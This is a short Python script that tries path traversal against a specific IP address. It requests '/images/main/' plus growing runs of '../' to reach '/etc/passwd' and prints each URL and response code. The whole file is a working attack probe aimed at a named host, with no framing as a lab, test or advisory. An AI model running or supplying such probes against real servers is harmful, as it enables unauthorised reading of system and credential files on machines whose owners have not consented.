import requests

sub="../"
for x in range(4):
    url = "https://61.248.225.155/images/main/{}/etc/passwd".format(sub)
    sub=sub+sub
    res = requests.get(url)
    print url
    print res.status_code
